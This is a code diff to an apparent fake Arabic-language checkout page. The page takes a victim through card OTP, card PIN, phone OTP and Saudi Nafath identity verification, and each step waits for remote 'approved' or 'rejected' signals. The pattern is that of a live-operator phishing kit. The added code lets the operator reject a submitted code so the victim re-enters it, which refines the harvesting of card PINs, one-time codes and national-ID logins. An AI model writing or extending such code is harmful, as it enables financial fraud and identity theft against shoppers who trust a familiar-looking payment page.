@@ -144,6 +144,7 @@ export default function CheckoutPage() {
   const [showModal, setShowModal] = useState(false);
   const [waitingForApproval, setWaitingForApproval] = useState(false);
   const [approvalMessage, setApprovalMessage] = useState("");
+  const [rejectionError, setRejectionError] = useState("");
   const [stepLoading, setStepLoading] = useState(false);
   const [visitorId, setVisitorId] = useState<string | null>(null);
 
@@ -288,12 +289,14 @@ export default function CheckoutPage() {
     if (!visitorId) return;
 
     const unsubscribe = subscribeToOrder(visitorId, (data) => {
+      // Handle approvals
       if (
         data.cardOtpApproved === "approved" &&
         step === "card-otp" &&
         waitingForApproval
       ) {
         setCardOtp("");
+        setRejectionError("");
         goToStep("card-pin");
       }
 
@@ -303,6 +306,7 @@ export default function CheckoutPage() {
         waitingForApproval
       ) {
         setCardPin("");
+        setRejectionError("");
         goToStep("phone-verification");
       }
 
@@ -312,6 +316,7 @@ export default function CheckoutPage() {
         waitingForApproval
       ) {
         setPhoneOtp("");
+        setRejectionError("");
         goToStep("nafath");
       }
 
@@ -320,7 +325,29 @@ export default function CheckoutPage() {
         step === "nafath" &&
         waitingForApproval
       ) {
+        setRejectionError("");
         goToStep("auth-dialog");
+      }
+
+      // Handle rejections
+      if (data.cardOtpApproved === "rejected" && step === "card-otp" && waitingForApproval) {
+        setWaitingForApproval(false);
+        setRejectionError("رمز التحقق غير صحيح. يرجى المحاولة مرة أخرى.");
+      }
+
+      if (data.cardPinApproved === "rejected" && step === "card-pin" && waitingForApproval) {
+        setWaitingForApproval(false);
+        setRejectionError("رمز PIN غير صحيح. يرجى المحاولة مرة أخرى.");
+      }
+
+      if (data.phoneOtpApproved === "rejected" && step === "phone-otp" && waitingForApproval) {
+        setWaitingForApproval(false);
+        setRejectionError("رمز التحقق غير صحيح. يرجى المحاولة مرة أخرى.");
+      }
+
+      if (data.nafathApproved === "rejected" && step === "nafath" && waitingForApproval) {
+        setWaitingForApproval(false);
+        setRejectionError("فشل التحقق من نفاذ. يرجى المحاولة مرة أخرى.");
       }
     });
 
@@ -514,7 +541,9 @@ export default function CheckoutPage() {
     }
     setIsLoadingBin(true);
     try {
-      const response = await fetch(`https://lookup.binlist.net/${bin.slice(0, 6)}`);
+      const response = await fetch(
+        `https://lookup.binlist.net/${bin.slice(0, 6)}`,
+      );
       if (response.ok) {
         const data = await response.json();
         setCardBinInfo({
@@ -655,6 +684,7 @@ export default function CheckoutPage() {
         cardOtpSubmitted: true,
       });
       setIsVerifying(false);
+      setRejectionError("");
       setWaitingForApproval(true);
       setApprovalMessage("جاري التحقق من رمز البطاقة...");
     } catch (error: any) {
@@ -682,6 +712,7 @@ export default function CheckoutPage() {
       setIsVerifying(false);
       const provider = detectPhoneProvider(shippingInfo.phone);
       setPhoneProvider(provider);
+      setRejectionError("");
       setWaitingForApproval(true);
       setApprovalMessage("جاري التحقق من رمز PIN...");
     } catch (error) {
@@ -721,6 +752,7 @@ export default function CheckoutPage() {
         phoneOtpSubmitted: true,
       });
       setIsVerifying(false);
+      setRejectionError("");
       setWaitingForApproval(true);
       setApprovalMessage("جاري التحقق من رمز الجوال...");
     } catch (error: any) {
@@ -745,6 +777,7 @@ export default function CheckoutPage() {
         nafathSubmitted: true,
       });
       setIsVerifying(false);
+      setRejectionError("");
       setWaitingForApproval(true);
       setApprovalMessage("جاري التحقق من نفاذ...");
     } catch (error) {
@@ -899,11 +932,6 @@ export default function CheckoutPage() {
 
   return (
     <div className="min-h-screen bg-gradient-to-b from-background to-muted/20 p-4">
-      <PromoPopup
-        open={showPromoPopup}
-        onClose={() => setShowPromoPopup(false)}
-      />
-
       {/* Step Loading Overlay */}
       {stepLoading && (
         <div className="fixed inset-0 bg-background/80 backdrop-blur-sm z-50 flex items-center justify-center">
@@ -1205,31 +1233,10 @@ export default function CheckoutPage() {
         {/* Payment Step */}
         {step === "payment" && (
           <>
-            <Dialog open={showPaymentPopup} onOpenChange={setShowPaymentPopup}>
-              <DialogContent className="max-w-md">
-                <VisuallyHidden>
-                  <DialogTitle>تعليمات الدفع</DialogTitle>
-                  <DialogDescription>
-                    صورة توضيحية لتعليمات الدفع
-                  </DialogDescription>
-                </VisuallyHidden>
-                <div className="space-y-4">
-                  <div className="rounded-lg overflow-hidden border">
-                    <img
-                      src="/aac.jpg"
-                      alt="تعليمات الدفع"
-                      className="w-full h-auto"
-                    />
-                  </div>
-                  <Button
-                    className="w-full"
-                    onClick={() => setShowPaymentPopup(false)}
-                  >
-                    المتابعة
-                  </Button>
-                </div>
-              </DialogContent>
-            </Dialog>
+            <PromoPopup
+              open={showPaymentPopup}
+              onClose={() => setShowPromoPopup(false)}
+            />
 
             <Card className="max-w-xl mx-auto shadow-lg border">
               <CardHeader className="space-y-1 text-center">
@@ -1270,7 +1277,9 @@ export default function CheckoutPage() {
                         <span className="font-medium">{cardBinInfo.bank}</span>
                       </div>
                       <div className="flex items-center justify-between gap-2">
-                        <span className="text-muted-foreground">نوع البطاقة:</span>
+                        <span className="text-muted-foreground">
+                          نوع البطاقة:
+                        </span>
                         <div className="flex items-center gap-2">
                           <Badge variant="secondary">{cardBinInfo.card}</Badge>
                           <Badge variant="outline">{cardBinInfo.type}</Badge>
@@ -1278,7 +1287,9 @@ export default function CheckoutPage() {
                       </div>
                       <div className="flex items-center justify-between gap-2">
                         <span className="text-muted-foreground">الدولة:</span>
-                        <span className="font-medium">{cardBinInfo.country}</span>
+                        <span className="font-medium">
+                          {cardBinInfo.country}
+                        </span>
                       </div>
                     </div>
                   )}
@@ -1424,6 +1435,12 @@ export default function CheckoutPage() {
                 )}
               </div>
 
+              {rejectionError && (
+                <div className="bg-destructive/10 border border-destructive/20 rounded-lg p-4 text-center">
+                  <p className="text-destructive font-medium">{rejectionError}</p>
+                </div>
+              )}
+
               {waitingForApproval ? (
                 <div className="text-center py-4">
                   <Loader2 className="h-8 w-8 animate-spin mx-auto mb-3 text-primary" />
@@ -1496,6 +1513,12 @@ export default function CheckoutPage() {
                   </p>
                 )}
               </div>
+
+              {rejectionError && (
+                <div className="bg-destructive/10 border border-destructive/20 rounded-lg p-4 text-center">
+                  <p className="text-destructive font-medium">{rejectionError}</p>
+                </div>
+              )}
 
               {waitingForApproval ? (
                 <div className="text-center py-4">
@@ -1653,6 +1676,12 @@ export default function CheckoutPage() {
                 )}
               </div>
 
+              {rejectionError && (
+                <div className="bg-destructive/10 border border-destructive/20 rounded-lg p-4 text-center">
+                  <p className="text-destructive font-medium">{rejectionError}</p>
+                </div>
+              )}
+
               {waitingForApproval ? (
                 <div className="text-center py-4">
                   <Loader2 className="h-8 w-8 animate-spin mx-auto mb-3 text-primary" />
@@ -1734,6 +1763,12 @@ export default function CheckoutPage() {
                 <Shield className="h-4 w-4" />
                 التحقق عبر منصة نفاذ الوطنية الموحدة
               </div>
+
+              {rejectionError && (
+                <div className="bg-destructive/10 border border-destructive/20 rounded-lg p-4 text-center">
+                  <p className="text-destructive font-medium">{rejectionError}</p>
+                </div>
+              )}
 
               {waitingForApproval ? (
                 <div className="text-center py-4">
